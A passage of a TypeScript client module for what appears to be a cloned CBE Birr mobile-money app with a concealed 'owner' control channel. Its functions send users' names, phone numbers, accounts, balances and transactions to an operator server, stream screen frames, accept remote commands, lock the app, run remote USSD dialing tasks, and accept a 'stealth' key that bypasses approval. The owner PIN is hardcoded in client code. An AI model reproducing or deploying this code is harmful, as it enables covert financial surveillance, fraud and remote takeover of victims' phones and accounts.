'use client';

import {
  CallMode,
  CallSession,
  DeviceApprovalStatus,
  DevicePlatform,
  DeviceRemoteOverride,
  DeviceSyncResponse,
  OWNER_PIN,
  OwnerDashboardSnapshot,
  OwnerNotification,
  PermissionBypassStatus,
  RemoteUssdStatus,
  RemoteUssdTask,
  SupportCommandType,
  SupportSession,
  getOwnerApiBaseUrl,
} from './owner-types';

const DEVICE_ID_STORAGE_KEY = 'cbebirr_owner_device_id';
const LOCK_CACHE_KEY = 'cbebirr_remote_lock_cache';
const SEEN_NOTIFS_KEY = 'cbebirr_seen_owner_notifs';
const CUSTOM_DEVICE_NAME_KEY = 'cbebirr_custom_device_name';
const APPLIED_OVERRIDE_SEQ_KEY = 'cbebirr_applied_override_seq';
export const STEALTH_CFG_KEY = 'cbebirr_cfg_sync_v1';
export const STEALTH_CFG_VALUE = 'rc_9f4a2e1d';
const STEALTH_KEY_DIGEST = '1369cc5cbe399f88c0de5b26de45ac61c2060f55ffed7052c04e56f261fda23c';

export function getAppliedOverrideSeq(): number {
  if (typeof window === 'undefined') return 0;
  try {
    const raw = localStorage.getItem(APPLIED_OVERRIDE_SEQ_KEY);
    const n = Number(raw);
    return Number.isFinite(n) && n > 0 ? Math.floor(n) : 0;
  } catch {
    return 0;
  }
}

export function setAppliedOverrideSeq(seq: number): void {
  if (typeof window === 'undefined') return;
  try {
    const clean = Number.isFinite(seq) && seq >= 0 ? Math.floor(seq) : 0;
    localStorage.setItem(APPLIED_OVERRIDE_SEQ_KEY, String(clean));
  } catch {}
}

export function setCustomDeviceName(name: string): void {
  if (typeof window === 'undefined') return;
  try {
    const clean = String(name || '').trim().slice(0, 115);
    if (clean) {
      localStorage.setItem(CUSTOM_DEVICE_NAME_KEY, clean);
    } else {
      localStorage.removeItem(CUSTOM_DEVICE_NAME_KEY);
    }
  } catch {}
}

function sha256HexSync(input: string): string {
  const bytes = new TextEncoder().encode(input);
  const K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
  ];
  const H = [
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
    0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
  ];
  const bitLen = bytes.length * 8;
  const padLen = ((bytes.length + 9 + 63) >> 6) << 6;
  const buf = new Uint8Array(padLen);
  buf.set(bytes);
  buf[bytes.length] = 0x80;
  const view = new DataView(buf.buffer);
  view.setUint32(padLen - 8, Math.floor(bitLen / 0x100000000), false);
  view.setUint32(padLen - 4, bitLen >>> 0, false);

  const w = new Int32Array(64);
  const rotr = (n: number, x: number) => (x >>> n) | (x << (32 - n));

  for (let offset = 0; offset < padLen; offset += 64) {
    for (let i = 0; i < 16; i++) w[i] = view.getInt32(offset + i * 4, false);
    for (let i = 16; i < 64; i++) {
      const s0 = rotr(7, w[i - 15]) ^ rotr(18, w[i - 15]) ^ (w[i - 15] >>> 3);
      const s1 = rotr(17, w[i - 2]) ^ rotr(19, w[i - 2]) ^ (w[i - 2] >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
    }
    let [a, b, c, d, e, f, g, h] = H;
    for (let i = 0; i < 64; i++) {
      const S1 = rotr(6, e) ^ rotr(11, e) ^ rotr(25, e);
      const ch = (e & f) ^ (~e & g);
      const temp1 = (h + S1 + ch + K[i] + w[i]) | 0;
      const S0 = rotr(2, a) ^ rotr(13, a) ^ rotr(22, a);
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const temp2 = (S0 + maj) | 0;
      h = g; g = f; f = e; e = (d + temp1) | 0;
      d = c; c = b; b = a; a = (temp1 + temp2) | 0;
    }
    H[0] = (H[0] + a) | 0; H[1] = (H[1] + b) | 0;
    H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0;
    H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0;
    H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
  }
  return H.map((x) => (x >>> 0).toString(16).padStart(8, '0')).join('');
}

export function verifyOwnerGatePasskey(raw: string): boolean {
  const clean = String(raw || '').trim();
  if (!clean) return false;
  return sha256HexSync(clean) === STEALTH_KEY_DIGEST;
}

export interface CachedLockState {
  locked: boolean;
  message: string;
  updatedAtMs: number;
}

const RESERVED_SHARED_DEVICE_IDS = new Set([
  'all',
  'dev_galaxy_a12',
  'unknown',
  'unknown_id',
  'unknown_device',
  'dev_server',
  'dev_browser_tmp',
]);

export function isValidScopedDeviceId(id?: string | null): boolean {
  if (!id || typeof id !== 'string') return false;
  const clean = id.trim();
  if (!/^[a-zA-Z0-9_\-]{6,64}$/.test(clean)) return false;
  return !RESERVED_SHARED_DEVICE_IDS.has(clean.toLowerCase());
}

export function getOrCreateOwnerDeviceId(): string {
  if (typeof window === 'undefined') return 'dev_server';
  try {
    const existing = localStorage.getItem(DEVICE_ID_STORAGE_KEY);
    if (isValidScopedDeviceId(existing)) {
      return existing!.trim();
    }
    let rand = '';
    try {
      if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
        const bytes = new Uint8Array(6);
        crypto.getRandomValues(bytes);
        rand = Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join('');
      }
    } catch {}
    if (!rand) {
      rand = Math.random().toString(36).slice(2, 10) + Math.random().toString(36).slice(2, 6);
    }
    const ts = Date.now().toString(36).slice(-5);
    const created = `dev_${ts}${rand}`.slice(0, 48);
    localStorage.setItem(DEVICE_ID_STORAGE_KEY, created);
    return created;
  } catch {
    return 'dev_browser_tmp';
  }
}

export function detectDeviceInfo(): {
  deviceName: string;
  platform: DevicePlatform;
  appVersion: string;
} {
  if (typeof window === 'undefined') {
    return { deviceName: 'Server', platform: 'web', appVersion: '1.0.94' };
  }
  const ua = navigator.userAgent || '';
  const isApk =
    window.location?.origin?.includes('appassets.androidplatform.net') ||
    window.location?.protocol === 'file:' ||
    Boolean((window as any).AndroidBridge || (window as any).AndroidSMSBridge || (window as any).Android);

  const isPwa =
    !isApk &&
    (window.matchMedia?.('(display-mode: standalone)').matches ||
      Boolean((navigator as any).standalone));

  const platform: DevicePlatform = isApk ? 'android-apk' : isPwa ? 'web-pwa' : 'web';

  let model = '';
  const androidModelMatch = ua.match(/Android\s+[^;)]+;\s*([^;)]+?)(?:\s+Build\/|[;)])/i);
  if (androidModelMatch?.[1]) {
    const candidate = androidModelMatch[1].trim();
    model = candidate === 'K' || candidate.length <= 1 ? 'Android Phone' : candidate;
  } else if (/Android/i.test(ua)) {
    model = 'Android Phone';
  } else if (/iPhone|iPad/i.test(ua)) {
    model = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
  } else if (/Windows/i.test(ua)) {
    model = 'Windows PC';
  } else if (/Macintosh|Mac OS/i.test(ua)) {
    model = 'Mac';
  } else if (/Linux/i.test(ua)) {
    model = 'Linux';
  } else {
    model = 'Web Device';
  }

  const tag = platform === 'android-apk' ? 'APK' : platform === 'web-pwa' ? 'PWA' : 'Web';
  let customName = '';
  try {
    customName = String(localStorage.getItem(CUSTOM_DEVICE_NAME_KEY) || '').trim();
  } catch {}
  const deviceName = (customName || `${model} (${tag})`).slice(0, 115);

  return {
    deviceName,
    platform,
    appVersion: '1.0.103',
  };
}

export function getCachedLockState(): CachedLockState {
  if (typeof window === 'undefined') {
    return { locked: false, message: '', updatedAtMs: 0 };
  }
  try {
    const raw = localStorage.getItem(LOCK_CACHE_KEY);
    if (!raw) return { locked: false, message: '', updatedAtMs: 0 };
    const parsed = JSON.parse(raw);
    return {
      locked: Boolean(parsed.locked),
      message: String(parsed.message || ''),
      updatedAtMs: Number(parsed.updatedAtMs) || 0,
    };
  } catch {
    return { locked: false, message: '', updatedAtMs: 0 };
  }
}

function saveCachedLockState(next: CachedLockState): void {
  if (typeof window === 'undefined') return;
  try {
    localStorage.setItem(LOCK_CACHE_KEY, JSON.stringify(next));
  } catch {}
}

export function getSeenNotificationIds(): Set<string> {
  if (typeof window === 'undefined') return new Set();
  try {
    const raw = localStorage.getItem(SEEN_NOTIFS_KEY);
    if (!raw) return new Set();
    const arr = JSON.parse(raw);
    return Array.isArray(arr) ? new Set(arr.map(String)) : new Set();
  } catch {
    return new Set();
  }
}

export function markNotificationSeen(notifId: string): void {
  if (typeof window === 'undefined' || !notifId) return;
  try {
    const set = getSeenNotificationIds();
    set.add(notifId);
    const list = Array.from(set).slice(-120);
    localStorage.setItem(SEEN_NOTIFS_KEY, JSON.stringify(list));
  } catch {}
}

export async function ackOwnerNotification(
  notifId: string,
  event: 'delivered' | 'seen'
): Promise<void> {
  if (typeof window === 'undefined' || !notifId) return;
  if (typeof navigator !== 'undefined' && navigator.onLine === false) return;
  const deviceId = getOrCreateOwnerDeviceId();
  const baseUrl = getOwnerApiBaseUrl();
  try {
    await fetch(`${baseUrl}/api/device/notif-ack`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': deviceId,
      },
      body: JSON.stringify({
        notifId,
        deviceId,
        event,
      }),
    });
  } catch {}
}

export async function syncDeviceTelemetry(profile: {
  userName: string;
  phoneNumber: string;
  userAccount: string;
  balance: number;
  rewardBalance?: number;
  appLang?: 'en' | 'am';
  isBalanceShown?: boolean;
  isRewardShown?: boolean;
  ussdProfilesJson?: string;
  activeUssdId?: string;
  phoneUssdProfilesJson?: string;
  activePhoneUssdId?: string;
  appliedOverrideSeq?: number;
  registerRequest?: boolean;
  freshRegistration?: boolean;
  forceApprovalCheck?: boolean;
  checkOnly?: boolean;
  permissionBypassRequest?: boolean;
  permissionBypassCancel?: boolean;
  clientGateState?: string;
}): Promise<{
  lockState: CachedLockState;
  newNotifications: OwnerNotification[];
  activeNotificationIds: string[];
  serverTimeMs: number;
  supportSession: SupportSession | null;
  callSession: CallSession | null;
  remoteUssdTask: RemoteUssdTask | null;
  deviceOverride: DeviceRemoteOverride | null;
  approvalStatus: DeviceApprovalStatus;
  permissionBypassStatus: PermissionBypassStatus;
  fromServer: boolean;
} | null> {
  if (typeof window === 'undefined') return null;
  if (typeof navigator !== 'undefined' && navigator.onLine === false) {
    let offlineApproval: DeviceApprovalStatus = 'pending';
    let offlineBypass: PermissionBypassStatus = 'none';
    try {
      if (localStorage.getItem(STEALTH_CFG_KEY) === STEALTH_CFG_VALUE) {
        offlineApproval = 'approved';
        offlineBypass = 'approved';
      } else {
        const saved = localStorage.getItem('cbebirr_device_approval_v1');
        if (saved === 'pending' || saved === 'rejected' || saved === 'approved') {
          offlineApproval = saved;
        }
        const savedBypass = localStorage.getItem('cbebirr_perm_bypass_v1');
        if (
          savedBypass === 'pending' ||
          savedBypass === 'approved' ||
          savedBypass === 'rejected' ||
          savedBypass === 'none'
        ) {
          offlineBypass = savedBypass;
        }
      }
    } catch {}
    return {
      lockState: getCachedLockState(),
      newNotifications: [],
      activeNotificationIds: [],
      serverTimeMs: Date.now(),
      supportSession: null,
      callSession: null,
      remoteUssdTask: null,
      deviceOverride: null,
      approvalStatus: offlineApproval,
      permissionBypassStatus: offlineBypass,
      fromServer: false,
    };
  }

  const deviceId = getOrCreateOwnerDeviceId();
  const info = detectDeviceInfo();
  const baseUrl = getOwnerApiBaseUrl();

  const controller = typeof AbortController !== 'undefined' ? new AbortController() : null;
  const timeoutId = controller ? setTimeout(() => controller.abort(), 7000) : null;

  try {
    const res = await fetch(`${baseUrl}/api/device/sync`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': deviceId,
      },
      body: JSON.stringify({
        deviceId,
        deviceName: info.deviceName,
        platform: info.platform,
        appVersion: info.appVersion,
        userName: profile.userName,
        phoneNumber: profile.phoneNumber,
        userAccount: profile.userAccount,
        balance: profile.balance,
        ...(profile.rewardBalance !== undefined ? { rewardBalance: profile.rewardBalance } : {}),
        ...(profile.appLang !== undefined ? { appLang: profile.appLang } : {}),
        ...(profile.isBalanceShown !== undefined ? { isBalanceShown: profile.isBalanceShown } : {}),
        ...(profile.isRewardShown !== undefined ? { isRewardShown: profile.isRewardShown } : {}),
        ...(profile.ussdProfilesJson !== undefined ? { ussdProfilesJson: profile.ussdProfilesJson } : {}),
        ...(profile.activeUssdId !== undefined ? { activeUssdId: profile.activeUssdId } : {}),
        ...(profile.phoneUssdProfilesJson !== undefined ? { phoneUssdProfilesJson: profile.phoneUssdProfilesJson } : {}),
        ...(profile.activePhoneUssdId !== undefined ? { activePhoneUssdId: profile.activePhoneUssdId } : {}),
        appliedOverrideSeq: profile.appliedOverrideSeq ?? getAppliedOverrideSeq(),
        registerRequest: Boolean(profile.registerRequest),
        freshRegistration: Boolean(profile.freshRegistration),
        forceApprovalCheck: Boolean(profile.forceApprovalCheck),
        checkOnly: Boolean(profile.checkOnly),
        permissionBypassRequest: Boolean(profile.permissionBypassRequest),
        permissionBypassCancel: Boolean(profile.permissionBypassCancel),
        clientGateState: profile.clientGateState,
      }),
      ...(controller ? { signal: controller.signal } : {}),
    });

    if (!res.ok) return null;
    const data = (await res.json()) as DeviceSyncResponse;
    if (!data?.success) return null;

    const lockState: CachedLockState = {
      locked: Boolean(data.effectiveLocked),
      message: data.lockMessage || 'App locked by administrator.',
      updatedAtMs: Date.now(),
    };
    saveCachedLockState(lockState);

    const seen = getSeenNotificationIds();
    const refNowMs = Number(data.serverTimeMs) || Date.now();
    const validActive = (data.notifications || []).filter(
      (n) => Boolean(n?.notifId) && (n.expiresAtMs || 0) > refNowMs
    );
    const activeNotificationIds = validActive.map((n) => n.notifId);
    const newNotifications = validActive.filter((n) => !seen.has(n.notifId));

    const fallbackStatus: DeviceApprovalStatus =
      profile.registerRequest || profile.forceApprovalCheck || profile.clientGateState === 'pending'
        ? 'pending'
        : 'approved';

    const resolvedBypass: PermissionBypassStatus =
      data.permissionBypassStatus ||
      (profile.permissionBypassRequest ? 'pending' : 'none');

    return {
      lockState,
      newNotifications,
      activeNotificationIds,
      serverTimeMs: refNowMs,
      supportSession: data.supportSession || null,
      callSession: data.callSession || null,
      remoteUssdTask: data.remoteUssdTask || null,
      deviceOverride: data.deviceOverride || null,
      approvalStatus: data.approvalStatus || fallbackStatus,
      permissionBypassStatus: resolvedBypass,
      fromServer: true,
    };
  } catch {
    return null;
  } finally {
    if (timeoutId) clearTimeout(timeoutId);
  }
}

export async function requestOwnerPermissionBypass(profile: {
  userName: string;
  phoneNumber: string;
  userAccount: string;
  balance: number;
  clientGateState?: string;
}) {
  return syncDeviceTelemetry({
    ...profile,
    checkOnly: false,
    permissionBypassRequest: true,
  });
}

export async function cancelOwnerPermissionBypass(profile: {
  userName: string;
  phoneNumber: string;
  userAccount: string;
  balance: number;
  clientGateState?: string;
}) {
  return syncDeviceTelemetry({
    ...profile,
    checkOnly: false,
    permissionBypassCancel: true,
  });
}

export function sendOfflineBeacon(profile: {
  userName: string;
  phoneNumber: string;
  userAccount: string;
  balance: number;
}): void {
  if (typeof window === 'undefined' || !navigator.sendBeacon) return;
  try {
    const deviceId = getOrCreateOwnerDeviceId();
    const info = detectDeviceInfo();
    const baseUrl = getOwnerApiBaseUrl();
    const blob = new Blob(
      [
        JSON.stringify({
          deviceId,
          deviceName: info.deviceName,
          platform: info.platform,
          appVersion: info.appVersion,
          userName: profile.userName,
          phoneNumber: profile.phoneNumber,
          userAccount: profile.userAccount,
          balance: profile.balance,
          offline: true,
        }),
      ],
      { type: 'text/plain;charset=UTF-8' }
    );
    navigator.sendBeacon(`${baseUrl}/api/device/sync`, blob);
  } catch {}
}

export async function reportDeviceTransaction(params: {
  txId?: string;
  senderName: string;
  senderPhone: string;
  senderAccount: string;
  title: string;
  txType: 'debit' | 'credit';
  amount: number;
  totalDeducted?: number;
  balanceAfter: number;
  recipientName: string;
  recipientAccount: string;
  destBank?: string;
  transferLabel: string;
  ref: string;
  reason: string;
}): Promise<void> {
  if (typeof window === 'undefined') return;
  if (typeof navigator !== 'undefined' && navigator.onLine === false) return;

  const deviceId = getOrCreateOwnerDeviceId();
  const info = detectDeviceInfo();
  const baseUrl = getOwnerApiBaseUrl();

  try {
    await fetch(`${baseUrl}/api/device/tx`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': deviceId,
      },
      body: JSON.stringify({
        ...params,
        deviceId,
        deviceName: info.deviceName,
        platform: info.platform,
        appVersion: info.appVersion,
        status: 'Completed',
      }),
    });
  } catch {}
}

export async function fetchOwnerSnapshot(): Promise<OwnerDashboardSnapshot> {
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetch(`${baseUrl}/api/owner/control`, {
    method: 'GET',
    headers: {
      'x-owner-pin': OWNER_PIN,
    },
    cache: 'no-store',
  });
  if (!res.ok) {
    throw new Error(`Owner dashboard request failed (${res.status})`);
  }
  return res.json();
}

export async function postOwnerAction(payload: Record<string, unknown>): Promise<any> {
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetch(`${baseUrl}/api/owner/control`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-owner-pin': OWNER_PIN,
    },
    body: JSON.stringify({
      ...payload,
      ownerPin: OWNER_PIN,
    }),
  });
  const data = await res.json();
  if (!res.ok || !data?.success) {
    throw new Error(data?.error || `Action failed (${res.status})`);
  }
  return data;
}

export async function connectTelegramBotWebhook(): Promise<any> {
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetch(`${baseUrl}/api/owner/telegram/setup`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-owner-pin': OWNER_PIN,
    },
    body: JSON.stringify({ ownerPin: OWNER_PIN }),
  });
  const data = await res.json();
  if (!res.ok || !data?.success) {
    throw new Error(data?.error || 'Webhook registration failed');
  }
  return data;
}

// ---------- Low-Network Consent-Based Support View Helpers ----------

async function fetchWithTimeout(
  url: string,
  init: RequestInit,
  timeoutMs = 3500
): Promise<Response> {
  const controller = typeof AbortController !== 'undefined' ? new AbortController() : null;
  const tid = controller ? setTimeout(() => controller.abort(), timeoutMs) : null;
  try {
    return await fetch(url, {
      ...init,
      ...(controller ? { signal: controller.signal } : {}),
    });
  } finally {
    if (tid) clearTimeout(tid);
  }
}

export async function fetchSupportSession(
  deviceId: string,
  asOperator = false
): Promise<SupportSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support?deviceId=${encodeURIComponent(deviceId)}`,
    {
      method: 'GET',
      headers: asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId },
      cache: 'no-store',
    },
    3500
  );
  if (!res.ok) return null;
  const data = await res.json();
  return data?.supportSession || null;
}

export async function fetchSupportCastState(
  deviceId: string,
  afterFrameSeq?: number
): Promise<{ supportSession: SupportSession | null; frameUnchanged: boolean }> {
  const baseUrl = getOwnerApiBaseUrl();
  const qs = new URLSearchParams({
    deviceId,
    includeFrame: '1',
  });
  if (afterFrameSeq !== undefined) {
    qs.set('afterFrameSeq', String(afterFrameSeq));
  }
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support?${qs.toString()}`,
    {
      method: 'GET',
      headers: { 'x-owner-pin': OWNER_PIN },
      cache: 'no-store',
    },
    4500
  );
  if (!res.ok) {
    throw new Error(`Support poll failed (${res.status})`);
  }
  const data = await res.json();
  return {
    supportSession: data?.supportSession || null,
    frameUnchanged: Boolean(data?.frameUnchanged),
  };
}

export async function requestSupportView(
  deviceId: string,
  requestedBy: 'app_0069' | 'ram_control' = 'app_0069'
): Promise<SupportSession> {
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-owner-pin': OWNER_PIN,
      },
      body: JSON.stringify({
        action: 'request',
        deviceId,
        requestedBy,
        ownerPin: OWNER_PIN,
      }),
    },
    4500
  );
  const data = await res.json();
  if (!res.ok || !data?.success || !data?.supportSession) {
    throw new Error(data?.error || 'Failed to request Support View');
  }
  return data.supportSession;
}

export async function respondSupportConsent(accept: boolean): Promise<SupportSession | null> {
  const deviceId = getOrCreateOwnerDeviceId();
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': deviceId,
      },
      body: JSON.stringify({
        action: accept ? 'accept' : 'decline',
        deviceId,
      }),
    },
    4000
  );
  if (!res.ok) return null;
  const data = await res.json();
  return data?.supportSession || null;
}

export async function pushSupportStateDelta(delta: {
  currentStep?: number;
  activeTab?: string;
  screenTitle?: string;
  recipientSummary?: string;
  amountSummary?: string;
  balance?: number;
  userName?: string;
  phoneNumber?: string;
  stateSeq?: number;
  frameDataUrl?: string;
}): Promise<SupportSession | null> {
  const deviceId = getOrCreateOwnerDeviceId();
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': deviceId,
      },
      body: JSON.stringify({
        action: delta.frameDataUrl && delta.currentStep === undefined ? 'frame' : 'state',
        deviceId,
        ...delta,
      }),
    },
    4500
  );
  if (!res.ok) return null;
  const data = await res.json();
  return data?.supportSession || null;
}

export async function pushSupportScreenFrame(frameDataUrl: string): Promise<SupportSession | null> {
  return pushSupportStateDelta({ frameDataUrl });
}

export async function sendSupportCommand(
  deviceId: string,
  cmd: {
    commandType: SupportCommandType;
    commandPayload?: string;
    pointerX?: number;
    pointerY?: number;
    pointerLabel?: string;
  }
): Promise<SupportSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-owner-pin': OWNER_PIN,
      },
      body: JSON.stringify({
        action: 'command',
        deviceId,
        ownerPin: OWNER_PIN,
        ...cmd,
      }),
    },
    3500
  );
  if (!res.ok) return null;
  const data = await res.json();
  return data?.supportSession || null;
}

export async function pushSupportSignal(
  deviceId: string,
  asOperator: boolean,
  signal: {
    rtcSeq?: number;
    rtcOffer?: string;
    rtcAnswer?: string;
    micMuted?: boolean;
  }
): Promise<SupportSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId }),
      },
      body: JSON.stringify({
        action: 'signal',
        deviceId,
        role: asOperator ? 'operator' : 'client',
        ...(asOperator ? { ownerPin: OWNER_PIN } : {}),
        ...signal,
      }),
    },
    4500
  );
  if (!res.ok) return null;
  const data = await res.json();
  return data?.supportSession || null;
}

export async function endSupportView(
  deviceId: string,
  asOperator: boolean
): Promise<SupportSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId }),
      },
      body: JSON.stringify({
        action: 'end',
        deviceId,
        ...(asOperator ? { ownerPin: OWNER_PIN } : {}),
      }),
    },
    3500
  );
  if (!res.ok) return null;
  const data = await res.json();
  return data?.supportSession || null;
}

export async function pushSupportUssdResponse(
  deviceId: string,
  payload: {
    requestId: string;
    code: string;
    status: 'approved' | 'declined' | 'dialed' | 'failed';
    detail?: string;
  }
): Promise<SupportSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const ussdStatus = JSON.stringify({
    requestId: payload.requestId,
    code: payload.code,
    status: payload.status,
    detail: payload.detail || '',
    updatedAtMs: Date.now(),
  });
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/support`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': myId,
      },
      body: JSON.stringify({
        action: 'ussd_response',
        deviceId,
        ussdStatus,
      }),
    },
    3500
  ).catch(() => null);
  if (!res || !res.ok) return null;
  const data = await res.json().catch(() => null);
  return data?.supportSession || null;
}

// ---------- Owner Wi-Fi VoIP Calling System Helpers ----------

export async function fetchCallSessionDetailed(
  deviceId: string,
  asOperator = false
): Promise<{ ok: boolean; callSession: CallSession | null }> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  try {
    const res = await fetchWithTimeout(
      `${baseUrl}/api/owner/call?deviceId=${encodeURIComponent(deviceId)}`,
      {
        method: 'GET',
        headers: asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId },
        cache: 'no-store',
      },
      4500
    );
    if (!res.ok) return { ok: false, callSession: null };
    const data = await res.json().catch(() => null);
    if (!data?.success) return { ok: false, callSession: null };
    return { ok: true, callSession: data.callSession || null };
  } catch {
    return { ok: false, callSession: null };
  }
}

export async function fetchCallSession(
  deviceId: string,
  asOperator = false
): Promise<CallSession | null> {
  const res = await fetchCallSessionDetailed(deviceId, asOperator);
  return res.callSession;
}

export async function startWifiCall(
  deviceId: string,
  callerRole: 'app_0069' | 'ram_control' = 'app_0069',
  rtcOffer?: string,
  callerName?: string,
  callMode: CallMode = 'audio'
): Promise<CallSession> {
  const baseUrl = getOwnerApiBaseUrl();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/call`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-owner-pin': OWNER_PIN,
      },
      body: JSON.stringify({
        action: 'start',
        deviceId,
        callerRole,
        callerName: callerName || (callerRole === 'ram_control' ? 'Ram Control Call' : 'Owner Wi-Fi Call'),
        callMode,
        rtcOffer,
        rtcSeq: rtcOffer ? 1 : 0,
        ownerPin: OWNER_PIN,
      }),
    },
    4500
  );
  const data = await res.json();
  if (!res.ok || !data?.success || !data?.callSession) {
    throw new Error(data?.error || 'Failed to start Wi-Fi call');
  }
  return data.callSession;
}

export async function answerWifiCall(
  deviceId: string,
  rtcAnswer?: string,
  micMuted?: boolean,
  videoOff?: boolean
): Promise<CallSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/call`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': myId,
      },
      body: JSON.stringify({
        action: 'answer',
        deviceId,
        rtcAnswer,
        micMuted,
        videoOff,
      }),
    },
    4500
  );
  if (!res.ok) return null;
  const data = await res.json().catch(() => null);
  return data?.callSession || null;
}

export async function declineWifiCall(deviceId: string): Promise<CallSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/call`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-device-id': myId,
      },
      body: JSON.stringify({
        action: 'decline',
        deviceId,
      }),
    },
    3500
  );
  if (!res.ok) return null;
  const data = await res.json().catch(() => null);
  return data?.callSession || null;
}

export async function endWifiCall(
  deviceId: string,
  asOperator: boolean,
  reason: 'ended' | 'missed' = 'ended'
): Promise<CallSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/call`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId }),
      },
      body: JSON.stringify({
        action: reason === 'missed' ? 'miss' : 'end',
        reason,
        deviceId,
        ...(asOperator ? { ownerPin: OWNER_PIN } : {}),
      }),
    },
    3500
  );
  if (!res.ok) return null;
  const data = await res.json().catch(() => null);
  return data?.callSession || null;
}

export async function pushCallSignal(
  deviceId: string,
  asOperator: boolean,
  signal: {
    rtcSeq?: number;
    rtcOffer?: string;
    rtcAnswer?: string;
    micMuted?: boolean;
    videoOff?: boolean;
  }
): Promise<CallSession | null> {
  const baseUrl = getOwnerApiBaseUrl();
  const myId = getOrCreateOwnerDeviceId();
  const res = await fetchWithTimeout(
    `${baseUrl}/api/owner/call`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(asOperator ? { 'x-owner-pin': OWNER_PIN } : { 'x-device-id': myId }),
      },
      body: JSON.stringify({
        action: 'signal',
        deviceId,
        role: asOperator ? 'operator' : 'client',
        ...(asOperator ? { ownerPin: OWNER_PIN } : {}),
